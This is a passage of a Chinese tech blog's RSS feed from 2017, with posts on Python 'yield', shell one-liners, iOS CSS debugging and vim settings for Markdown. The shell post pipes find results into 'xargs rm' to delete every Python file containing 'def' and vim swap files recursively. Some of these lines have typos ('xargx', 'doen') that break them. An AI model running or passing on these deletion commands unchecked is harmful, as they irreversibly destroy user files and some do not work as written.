&lt;/ul&gt;

&lt;h3 id=&quot;0x1-理解&quot;&gt;0x1 理解&lt;/h3&gt;

&lt;p&gt;理解下面2个脚本的运行结果&lt;/p&gt;

&lt;p&gt;脚本1:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def a():
    print(111)

def b():
    flag='od'
    print(&quot;test&quot;)
    yield 1
    flag='ida'
    print(&quot;nihao&quot;)
    yield 2
    print(&quot;wohao&quot;)
    print(flag)

f1=a()
f2=b()

print(&quot;before for loop&quot;)

for i in f2:
    print(i,type(i))
    print(666)

print(&quot;after for loop&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;运行结果如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;111
before for loop
test
1 &amp;lt;class 'int'&amp;gt;
666
nihao
2 &amp;lt;class 'int'&amp;gt;
666
wohao
ida
after for loop
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;脚本2:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def h():
    print('Wen Chuan')
    m = yield 5  # Fighting!
    print(999999999999)
    d = yield 12
    print('We are together!')

c = h()
tmp=next(c)  #相当于c.send(None)
print(11111111111)
print(tmp)
print(222)
tmp=c.send('Fighting!')  #(yield 5)表达式被赋予了'Fighting!'
print(3333)
print(tmp)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;运行结果如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Wen Chuan
11111111111
5
222
999999999999
3333
12
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Thu, 21 Dec 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/python/2017/12/21/%E7%90%86%E8%A7%A3yield/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2017/12/21/%E7%90%86%E8%A7%A3yield/</guid>
        
        <category>yield</category>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>实用shell命令</title>
        <description>&lt;h3 id=&quot;0x0-预备知识&quot;&gt;0x0 预备知识&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;之所以能用到xargs这个命令,是由于很多命令不支持&lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt;管道来传递参数&lt;/li&gt;
  &lt;li&gt;ack中:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-r&lt;/code&gt;代表在当前目录的子目录中递归查找&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-l&lt;/code&gt;代表列出符合匹配内容的文件名&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-i&lt;/code&gt;代表在正则查找时忽略大小写&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;for用法:
&lt;code class=&quot;highlighter-rouge&quot;&gt;for each in $(command1);do command2;done&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;find中:
    &lt;ul&gt;
      &lt;li&gt;正则查找文件名时查找的文件名是包含完整路径的,也即正则表达式要匹配完整路径&lt;/li&gt;
      &lt;li&gt;macOS下的正则查找文件名和普通linux下的正则查找文件名用法不同
        &lt;ul&gt;
          &lt;li&gt;macOS中正则查找文件名用法为&lt;code class=&quot;highlighter-rouge&quot;&gt;find -E . -regex &quot;正则&quot;&lt;/code&gt;&lt;/li&gt;
          &lt;li&gt;普通linux中正则查找文件名用法为&lt;code class=&quot;highlighter-rouge&quot;&gt;find . -regextype posix-extended -regex &quot;正则&quot;&lt;/code&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;find查找时不想显示Permission denied的信息可这样&lt;code class=&quot;highlighter-rouge&quot;&gt;find ... 2&amp;gt;&amp;amp;1 | grep -v &quot;Permission denied&quot;&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;find正则查找文件名时忽略大小写用法为:将&lt;code class=&quot;highlighter-rouge&quot;&gt;-regex&lt;/code&gt;替换成&lt;code class=&quot;highlighter-rouge&quot;&gt;-iregex&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2&amp;gt;&amp;amp;1&lt;/code&gt;中:
    &lt;ul&gt;
      &lt;li&gt;0,1,2分别代表标准输入,标准输出,标准错误&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&amp;amp;1&lt;/code&gt;的写法是为了区别&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;1&lt;/code&gt;这个重定向到文件名为1的文件,&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&amp;amp;1&lt;/code&gt;表示重定向到标准输出&lt;/li&gt;
      &lt;li&gt;find命令查找文件名时会在终端中显示标准输出和标准错误的信息,也即&lt;code class=&quot;highlighter-rouge&quot;&gt;find ... == find ... 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;find命令遇到没有权限的文件会显示权限不足,显示权限不足的信息是标准错误&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2&amp;gt;/dev/null&lt;/code&gt;的功能是将标准错误重定向到/dev/null&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;grep -v&lt;/code&gt;中&lt;code class=&quot;highlighter-rouge&quot;&gt;-v&lt;/code&gt;表示查找不匹配的&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;0x1-items&quot;&gt;0x1 Items&lt;/h3&gt;

&lt;p&gt;1.查找当前目录下包括子目录内所有的包含’def’字符串的python文件,并删除这些文件&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find . -name &quot;*.py&quot; | xargx ack -ri 'def' | xargs rm
或者
for file in $(find . -name &quot;*.py&quot;);do ack -il 'def' $file &amp;amp;&amp;amp; rm $file;done
或者
for file in $(find . -name &quot;*.py&quot; | xargs ack -li 'def');do rm $file;done
或者
for file in $(find . -name &quot;*.py&quot;);do ack -il 'def' $file;doen | xargs rm
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2.查找当前目录下包括子目录内所有的临时文件(.swp,.swm,.swn,.swo等,但不包括.swf),并删除这些文件&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;macOS下:

find -E . -regex &quot;.+\.sw[^f]$&quot; 2&amp;gt;/dev/null | xargs rm
或
find -E . -regex &quot;.+\.sw[^f]$&quot; | grep -v &quot;Permission denied&quot; | xargs rm
或
find -E . -regex &quot;.+\.sw[^f]$&quot; 2&amp;gt;&amp;amp;1 | grep -v &quot;Permission denied&quot; | xargs rm


普通linux下:
find . -regextype posix-extended -regex &quot;.+\.sw[^f]$&quot; | grep -v &quot;Permission denied&quot; | xargs rm
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;3.to be continue…&lt;/p&gt;
</description>
        <pubDate>Thu, 21 Dec 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/linux/2017/12/21/%E5%AE%9E%E7%94%A8shell%E5%91%BD%E4%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/linux/2017/12/21/%E5%AE%9E%E7%94%A8shell%E5%91%BD%E4%BB%A4/</guid>
        
        <category>shell</category>
        
        
        <category>linux</category>
        
      </item>
    
      <item>
        <title>ios的css调试</title>
        <description>&lt;h3 id=&quot;0x0-about&quot;&gt;0x0 About&lt;/h3&gt;

&lt;p&gt;css调试中,ios设备比较特殊(具备高清显示屏),物理像素和css像素值不相同,调试css时方法特殊&lt;/p&gt;

&lt;h3 id=&quot;0x1-必读link&quot;&gt;0x1 必读link&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.zhihu.com/question/35221839&quot;&gt;现在手机分辨率这么大,如何写响应式布局&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://stephen.io/mediaqueries/&quot;&gt;CSS Media Queries for 
iPads &amp;amp; iPhones&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/needim/d15fdc2ac133d8078f7c&quot;&gt;Device Specific CSS Media Queries Collection&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;0x2-solution&quot;&gt;0x2 Solution&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/* porttrait是标准显示 */
/* landscape是放大显示 */
/* 这里用的是iPhone 6 portrait,iphone6标准显示*/
@media only screen and (min-device-width: 375px)
  and (max-device-width: 667px)
  and (orientation: portrait)
  and (-webkit-min-device-pixel-ratio: 2)
{...}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;方法一&quot;&gt;方法一&lt;/h4&gt;

&lt;p&gt;使用ios上的safari真机调试css,具体步骤如下&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;macOS|safari|偏好设置|高级选项|打开在菜单栏中显示开发功能&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ios上打开设置|safari|高级|web检查器&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;手机usb连接上mac,点mac上的safari的菜单栏上的开发,里面有手机子选项,打开它&lt;/li&gt;
  &lt;li&gt;然后在mac上的safari中修改css文件并查看手机上safari的显示效果&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;方法二&quot;&gt;方法二&lt;/h4&gt;

&lt;p&gt;chrome手机模式中选择iphone,并在chrome中直接调试css&lt;/p&gt;

&lt;p&gt;&lt;em&gt;css需要用对应ios设备的标准显示对应的media query,也即用portrait对应的media query&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x3-其它&quot;&gt;0x3 其它&lt;/h3&gt;

&lt;p&gt;jekyll的css调试可参考如下图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/css.png&quot; alt=&quot;调试图&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 20 Dec 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/12/20/ios%E7%9A%84css%E8%B0%83%E8%AF%95/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/12/20/ios%E7%9A%84css%E8%B0%83%E8%AF%95/</guid>
        
        <category>css</category>
        
        <category>ios</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>vim写markdown</title>
        <description>&lt;h3 id=&quot;必读link&quot;&gt;必读link&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.lequochung.me/2016/11/11/better-markdown-writing-experience-on-vim.html&quot;&gt;Better Writing Markdown Experience on Vim&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://vim.wikia.com/wiki/Move_cursor_by_display_lines_when_wrapping&quot;&gt;Move cursor by display lines when wrapping&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.swamphogg.com/2015/vim-setup/&quot;&gt;Vim Setup for Markdown&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;why&quot;&gt;Why&lt;/h3&gt;

&lt;p&gt;几乎所有markdown编辑器在编辑markdown的一个段落时都是不换行的,也即一段不换行,一段就是一行,不过在这些编辑器中眼睛看到的是”换行的”,实际上是没有换行的,可通过使用记事本等文本工具打开来验证这一点.为什么这些markdown编辑器不将一个段落的内容进行换行呢?&lt;strong&gt;在markdown中,可通过连续的两个空格加上换行符实现段内换行&lt;/strong&gt;,笔者认为只有不进行换行才能达到自适应不同屏幕的好的显示效果,如果在段落中按照每行一个合理的固定长度(如79个字符长度)进行自动换行,那么在不同大小的屏幕上显示这个markdown的段落时会有一些多余的空格符,因为markdown在渲染成html后将一个单独的换行符(\n)变成一个空格符,这样写出的markdown不是最好的markdown,这种情况的详情在&lt;a href=&quot;https://github.com/iamcco/markdown-preview.vim/issues/54&quot;&gt;这里&lt;/a&gt;,渲染后的效果如下图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/markdown.png&quot; alt=&quot;换行变成空格&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以在用vim写markdown时要向markdown编辑器学习,一段不换行.可通过vim的set wrap实现,不过这样设置后vim编辑的时候用默认的设置会有”不适”,如j/k的使用,0/$的使用等.&lt;/p&gt;

&lt;h3 id=&quot;how&quot;&gt;How&lt;/h3&gt;

&lt;p&gt;为解决vim开启wrap写markdown时的一些”不适”,可在vimrc中设置如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;markdown setting
au BufNewFile,BufReadPost *.{md,mdown,mkd,mkdn,markdown,mdwn} set filetype=markdown
au BufNewFile,BufReadPost,BufWrite *.{md,mdown,mkd,mkdn,markdown,mdwn} syntax match Comment /\%^---\_.\{-}---$/
au FileType markdown setlocal linebreak    &quot; Avoid wrap breaking words
au FileType markdown setlocal nolist       &quot; Make sure linebreak work as expected
au FileType markdown setlocal textwidth=0 &quot; Remove text width limit

&quot; for wrap is on
noremap  &amp;lt;buffer&amp;gt; &amp;lt;silent&amp;gt; k gk
&quot; for wrap is on
noremap  &amp;lt;buffer&amp;gt; &amp;lt;silent&amp;gt; j gj
&quot; for wrap is on
noremap  &amp;lt;buffer&amp;gt; &amp;lt;silent&amp;gt; 0 g0
&quot; for wrap is on
noremap  &amp;lt;buffer&amp;gt; &amp;lt;silent&amp;gt; $ g$

inoremap &amp;lt;c-h&amp;gt; &amp;lt;left&amp;gt;
&quot; for wrap is on
inoremap &amp;lt;c-j&amp;gt; &amp;lt;esc&amp;gt;gjli
&quot; for wrap is on
inoremap &amp;lt;c-k&amp;gt; &amp;lt;esc&amp;gt;gkli
inoremap &amp;lt;c-l&amp;gt; &amp;lt;right&amp;gt;
cnoremap &amp;lt;c-h&amp;gt; &amp;lt;left&amp;gt;
cnoremap &amp;lt;c-j&amp;gt; &amp;lt;down&amp;gt;
cnoremap &amp;lt;c-k&amp;gt; &amp;lt;up&amp;gt;
cnoremap &amp;lt;c-l&amp;gt; &amp;lt;right&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上面是不用插件的方法,也可使用&lt;a href=&quot;https://github.com/reedes/vim-pencil&quot;&gt;vim-pencil&lt;/a&gt;插件实现这个功能,此外vim-pencil插件还有其他的功能,使用vim-pencil插件后适应markdown的wrap开启状态的编写设置如下,其中vim-pencil已具备jk0$自动换成&lt;code class=&quot;highlighter-rouge&quot;&gt;gj/gk/g0/g$&lt;/code&gt;的功能,此外上面的设置中其他功能尚未测试,于是同样保留在vimrc中&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Plugin 'reedes/vim-pencil'  &quot;安装这个插件,放在较靠前位置
...
...
let g:pencil#wrapModeDefault = 'soft'   &quot; default is 'hard'

&quot;markdown setting
au BufNewFile,BufReadPost *.{md,mdown,mkd,mkdn,markdown,mdwn} set filetype=markdown
au BufNewFile,BufReadPost,BufWrite *.{md,mdown,mkd,mkdn,markdown,mdwn} syntax match Comment /\%^---\_.\{-}---$/
au FileType markdown setlocal linebreak    &quot; Avoid wrap breaking words
au FileType markdown setlocal nolist       &quot; Make sure linebreak work as expected
au FileType markdown setlocal textwidth=0 &quot; Remove text width limit

augroup pencil
  autocmd!
  autocmd FileType markdown,mkd call pencil#init()
  autocmd FileType text         call pencil#init({'wrap': 'hard'})
augroup END

inoremap &amp;lt;c-h&amp;gt; &amp;lt;left&amp;gt;
&quot; for wrap is on
inoremap &amp;lt;c-j&amp;gt; &amp;lt;esc&amp;gt;gjli
&quot; for wrap is on
inoremap &amp;lt;c-k&amp;gt; &amp;lt;esc&amp;gt;gkli
inoremap &amp;lt;c-l&amp;gt; &amp;lt;right&amp;gt;
cnoremap &amp;lt;c-h&amp;gt; &amp;lt;left&amp;gt;
cnoremap &amp;lt;c-j&amp;gt; &amp;lt;down&amp;gt;
cnoremap &amp;lt;c-k&amp;gt; &amp;lt;up&amp;gt;
cnoremap &amp;lt;c-l&amp;gt; &amp;lt;right&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 19 Dec 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/vim/2017/12/19/vim%E5%86%99markdown/</link>
        <guid isPermaLink="true">http://localhost:4000/vim/2017/12/19/vim%E5%86%99markdown/</guid>
        
        <category>markdown</category>
        
        <category>vim</category>
        
        
        <category>vim</category>
        
      </item>
    
  </channel>
</rss>
